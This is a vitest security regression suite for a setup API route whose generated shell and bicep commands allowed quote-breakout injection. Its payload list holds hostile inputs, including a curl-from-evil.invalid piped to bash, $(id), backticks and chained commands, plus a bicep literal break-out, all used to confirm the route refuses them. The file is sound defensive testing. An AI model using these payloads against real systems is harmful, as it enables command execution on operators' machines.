/**
 * Security regression tests for POST /api/setup/identity (#3610).
 *
 * THE DEFECT
 * ----------
 * POST returns two artifacts the product tells a PRIVILEGED HUMAN to use: a
 * `bootstrapScript` shell command to paste into a terminal, and a set of bicep
 * `deployParams`. Both were assembled by interpolating request text straight
 * into single-quoted words with no validation at all:
 *
 *     `EXISTING_CLIENT_ID='${…existingClientId…}'`
 *     `CONSOLE_HOSTS='${consoleHosts}'`
 *     deployParams.loomMsalClientId       = `'${…existingClientId…}'`
 *     deployParams.loomTenantAdminGroupId = `'${adminGroupId}'`
 *
 * One `'` in any of those closes the quoted word, and everything after it is
 * shell syntax in a command line that already carries KEYVAULT_NAME and
 * CONSOLE_RG and ends in `bash scripts/csa-loom/bootstrap-msal-app-reg.sh`.
 * Same class as GHSA-fj7j-qq8g-hqj8 (wire-existing); the sink is the operator's
 * terminal rather than `execSync`.
 *
 * WHAT THIS FILE PINS, AND WHY IN THIS SHAPE
 * ------------------------------------------
 * 1. THE WHOLE POPULATION, NOT ONE FIELD. There are FOUR interpolation sinks
 *    fed by THREE distinct caller-controlled fields (`existingClientId` reaches
 *    two of them — the shell command AND the bicep params, which are separate
 *    paste targets). A test covering only `existingClientId` would pass while
 *    `consoleHosts` and `groupId` stayed wide open — and `consoleHosts` is not
 *    even sent by the wizard UI, so it is reachable ONLY by a direct API call
 *    and is exactly what a UI-driven test would miss. Every field is exercised
 *    against every payload below.
 *
 * 2. AN EMBEDDED POSITIVE CONTROL. Before this PR there was no test of this
 *    route at all (`app/api/setup/__tests__/` had nine specs, none for
 *    `identity`), so a new guard starts from ZERO population and a green run
 *    would be indistinguishable from a run that never executed the route. The
 *    `accepts a legitimate choice` case is that control: it asserts the route
 *    is reachable and that a VALID payload still produces a working command
 *    with the values intact. If the module failed to import or the refusal
 *    logic refused everything, that case goes red.
 *
 * 3. A SINK-COUNT INVARIANT (the anti-narrow-bypass control). Per-field tests
 *    only cover the fields that exist today. `no raw quoted interpolation
 *    outside q()` reads THIS ROUTE'S SOURCE and asserts there is exactly ONE
 *    raw `'${…}'` in the file — the one inside `q()` itself, which is the
 *    chokepoint that performs the inertness check. Adding a fifth sink without
 *    routing it through `q()` makes that count 2 and the test goes red, whether
 *    or not anyone remembered to add a payload case for the new field.
 *
 * No test in this file contacts Graph, Azure, or a shell.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';

// ── session: a signed-in operator (so the tests exercise validation, not 401) ──
const getSessionMock = vi.fn(
  () => ({ claims: { oid: 'aaaaaaaa-1111-2222-3333-444444444444', upn: 'admin@t.com' }, exp: Date.now() / 1000 + 3600 }) as any,
);
vi.mock('@/lib/auth/session', () => ({
  getSession: () => getSessionMock(),
  tenantScopeId: (s: any) => s?.claims?.tid ?? s?.claims?.oid,
}));

// The route builds a UAMI credential at MODULE scope and calls Graph in GET.
// Neither may reach the network here.
vi.mock('@/lib/azure/arm-credential', () => ({
  uamiArmCredential: () => ({ getToken: async () => null }),
}));
vi.mock('@/lib/auth/msal', () => ({ graphBase: () => 'https://graph.example.invalid' }));

/** A syntactically valid Entra application id / group object id. */
const VALID_CLIENT_ID = 'bbbbbbbb-cccc-dddd-eeee-ffffffffffff';
const VALID_GROUP_ID = '11111111-2222-3333-4444-555555555555';

function postReq(body: any) {
  return { url: 'http://x/api/setup/identity', json: async () => body } as any;
}

beforeEach(() => {
  getSessionMock.mockReturnValue({
    claims: { oid: 'aaaaaaaa-1111-2222-3333-444444444444', upn: 'admin@t.com' },
    exp: Date.now() / 1000 + 3600,
  } as any);
});

afterEach(() => {
  vi.restoreAllMocks();
  vi.resetModules();
});

/**
 * The payload shapes that break OUT of a single-quoted shell word, plus the
 * bicep-literal equivalents. `'` ends the quoted word; `$(…)`/backticks
 * substitute a command; `\n` starts a new one; `;`/`|`/`&&` chain one.
 */
const INJECTION_PAYLOADS: Array<[string, string]> = [
  ['quote break-out + command', "x' ; curl http://evil.invalid/s.sh | bash ; '"],
  ['single quote alone', "x'"],
  ['command substitution', 'x$(id)'],
  ['backticks', 'x`id`'],
  ['newline', 'x\necho pwned'],
  ['semicolon', 'x;echo pwned'],
  ['pipe', 'x|echo pwned'],
  ['embedded whitespace', 'x y'],
  ['bicep literal break-out', "x' , loomMsalAppReg: '"],
];

/**
 * Every caller-controlled field that reaches an interpolation sink, with the
 * request shape that makes the route actually EMIT it. `existingClientId`
 * appears once but feeds TWO sinks (bootstrapScript + deployParams).
 */
const CALLER_SINKS: Array<{
  field: string;
  body: (payload: string) => any;
}> = [
  {
    field: 'appRegistration.existingClientId',
    body: (p) => ({ appRegistration: { mode: 'existing', existingClientId: p }, bootstrapAdmin: { mode: 'self' } }),
  },
  {
    field: 'appRegistration.consoleHosts',
    body: (p) => ({ appRegistration: { mode: 'new', consoleHosts: p }, bootstrapAdmin: { mode: 'self' } }),
  },
  {
    field: 'bootstrapAdmin.groupId',
    body: (p) => ({ appRegistration: { mode: 'new' }, bootstrapAdmin: { mode: 'group', groupId: p } }),
  },
];

describe('POST /api/setup/identity — operator-terminal command injection (#3610)', () => {
  // The cross-product: EVERY caller sink against EVERY payload. Scoping this to
  // one field is the narrow bypass that passes CI while the route stays open.
  for (const sink of CALLER_SINKS) {
    it.each(INJECTION_PAYLOADS)(
      `refuses ${sink.field} carrying %s, and emits no command`,
      async (_label, payload) => {
        const { POST } = await import('../identity/route');
        const res = await POST(postReq(sink.body(payload)), undefined as any);

        expect(res.status).toBe(400);
        const j = await res.json();
        expect(j.ok).toBe(false);
        expect(j.field).toBe(sink.field);

        // The load-bearing assertion: NEITHER paste target was produced. The
        // whole response is serialized and searched, so a payload surfacing in
        // deployParams, in bootstrapScript, or anywhere else fails this.
        const serialized = JSON.stringify(j);
        expect(serialized).not.toContain(payload);
        expect(j.apply).toBeUndefined();
      },
    );
  }

  it('refuses an existingClientId that is not a GUID (both sinks, one refusal)', async () => {
    const { POST } = await import('../identity/route');
    const res = await POST(
      postReq({ appRegistration: { mode: 'existing', existingClientId: 'not-a-guid' }, bootstrapAdmin: { mode: 'self' } }),
      undefined as any,
    );
    expect(res.status).toBe(400);
    const j = await res.json();
    expect(j.field).toBe('appRegistration.existingClientId');
    expect(j.apply).toBeUndefined();
  });

  it('refuses a consoleHosts entry that carries a scheme or a path', async () => {
    const { POST } = await import('../identity/route');
    for (const bad of ['https://loom.example.com', 'loom.example.com/callback', 'loom.example.com:8443']) {
      const res = await POST(
        postReq({ appRegistration: { mode: 'new', consoleHosts: bad }, bootstrapAdmin: { mode: 'self' } }),
        undefined as any,
      );
      expect(res.status).toBe(400);
      expect((await res.json()).field).toBe('appRegistration.consoleHosts');
    }
  });

  // ── EMBEDDED POSITIVE CONTROL ──────────────────────────────────────────────
  // Proves the route is reachable and the refusals above are discriminating
  // rather than blanket. Without this, a module that threw on import — or a
  // validator that refused everything — would look identical to a passing run.
  it('accepts a legitimate choice and emits the command with the values intact', async () => {
    const { POST } = await import('../identity/route');
    const res = await POST(
      postReq({
        appRegistration: { mode: 'existing', existingClientId: VALID_CLIENT_ID, consoleHosts: 'loom.example.com, csa-loom.example.org' },
        bootstrapAdmin: { mode: 'group', groupId: VALID_GROUP_ID },
      }),
      undefined as any,
    );

    expect(res.status).toBe(200);
    const j = await res.json();
    expect(j.ok).toBe(true);
    expect(j.applied).toBe(false);
    // The shell command carries both values, single-quoted, and the host list
    // is re-emitted in NORMALIZED form (the caller's stray space is gone —
    // the route emits what it rebuilt from validated tokens, not the raw text).
    expect(j.apply.bootstrapScript).toContain(`EXISTING_CLIENT_ID='${VALID_CLIENT_ID}'`);
    expect(j.apply.bootstrapScript).toContain("CONSOLE_HOSTS='loom.example.com,csa-loom.example.org'");
    expect(j.apply.bootstrapScript).toContain('bash scripts/csa-loom/bootstrap-msal-app-reg.sh');
    // The bicep params carry them too — the second paste target.
    expect(j.apply.deployParams.loomMsalClientId).toBe(`'${VALID_CLIENT_ID}'`);
    expect(j.apply.deployParams.loomTenantAdminGroupId).toBe(`'${VALID_GROUP_ID}'`);
  });

  it('still accepts the default new/self choice with no optional fields', async () => {
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);
    expect(res.status).toBe(200);
    const j = await res.json();
    expect(j.ok).toBe(true);
    expect(j.appRegistration.mode).toBe('new');
    // The session oid is interpolated too — it is not caller-controlled, but it
    // still passes through the sink guard, so it must survive unchanged.
    expect(j.apply.deployParams.loomTenantAdminOid).toBe("'aaaaaaaa-1111-2222-3333-444444444444'");
  });

  it('an unauthenticated POST gets the byte-exact 401 the hand-rolled prologue returned', async () => {
    getSessionMock.mockReturnValue(null as any);
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);
    expect(res.status).toBe(401);
    // withSession → apiUnauthorized() → apiError('unauthenticated', 401).
    // MEASURED equal to the prologue it replaced, not assumed (L4 §4).
    expect(await res.json()).toEqual({ ok: false, error: 'unauthenticated' });
  });
});

describe('POST /api/setup/identity — sink-count invariant', () => {
  /** The route source with comments stripped, so the worked examples in the
   *  module docblock are not mistaken for live sinks. */
  function routeCode(): string {
    const file = path.join(__dirname, '..', 'identity', 'route.ts');
    const src = fs.readFileSync(file, 'utf8');
    // CRLF-safe: `[\s\S]` and `[^\n]` both work regardless of \r placement.
    return src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, '');
  }

  it('has exactly ONE raw quoted interpolation, and it is inside q()', () => {
    const code = routeCode();
    // A control on the control: the strip must not have eaten the file.
    expect(code).toContain('export const POST');
    expect(code.length).toBeGreaterThan(1000);

    const rawSinks = code.match(/'\$\{/g) ?? [];
    // ONE — the `return `'${value}'`` inside q(), which is where the inertness
    // assertion lives. A second one means a value reaches a shell/bicep literal
    // without passing INERT_VALUE_RE.
    expect(rawSinks.length).toBe(1);
    expect(code).toMatch(/function q\([^)]*\)[^{]*\{[\s\S]*?INERT_VALUE_RE\.test\(value\)[\s\S]*?'\$\{value\}'/);
  });

  it('routes every emitted value through q() with a named field', () => {
    const code = routeCode();
    const calls = code.match(/\bq\('/g) ?? [];
    // Five emission sites: loomMsalClientId, loomTenantAdminOid,
    // loomTenantAdminGroupId, CONSOLE_HOSTS, EXISTING_CLIENT_ID.
    expect(calls.length).toBe(5);
  });

  // ── EMBEDDED CONTROL FOR L2 ───────────────────────────────────────────────
  // The q() inertness check is a guard whose population is EMPTY as long as the
  // L1 allow-lists hold: every caller field is refused with 400 before it can
  // reach a sink, so a test driving a caller field proves L1 and says nothing
  // about L2. Measured, not theorised — disabling the INERT_VALUE_RE assertion
  // while leaving L1 intact left all 65 tests GREEN (mutation M3). A guard that
  // survives its own removal is not a guard.
  //
  // `session.claims.oid` is L2's LIVE population: it is interpolated into
  // `deployParams.loomTenantAdminOid` and has no L1 allow-list by design (it is
  // not caller input). q() is therefore the ONLY thing between a claim value
  // and an emitted bicep literal, and this case exercises exactly that.
  it('q() refuses a non-inert SESSION-derived value — the sink L1 does not cover', async () => {
    const hostile = "aaaa' , loomMsalAppReg: { enabled: false } , x: '";
    getSessionMock.mockReturnValue({ claims: { oid: hostile, upn: 'admin@t.com' }, exp: Date.now() / 1000 + 3600 } as any);
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);

    // Fails CLOSED through withSession's catch → apiServerError (500). What
    // matters is that nothing was emitted, not which status it chose.
    expect(res.status).toBe(500);
    const serialized = JSON.stringify(await res.json());
    expect(serialized).not.toContain(hostile);
    expect(serialized).not.toContain('loomMsalAppReg');
  });

  it('q() lets an inert session oid through unchanged (the discriminating half)', async () => {
    // Without this, "refuses everything" would look identical to a working
    // guard. Synthetic/dev sessions really do carry non-GUID oids like
    // `oid-test`, and those are inert, so they must still work.
    getSessionMock.mockReturnValue({ claims: { oid: 'oid-test', upn: 'admin@t.com' }, exp: Date.now() / 1000 + 3600 } as any);
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);
    expect(res.status).toBe(200);
    expect((await res.json()).apply.deployParams.loomTenantAdminOid).toBe("'oid-test'");
  });
});
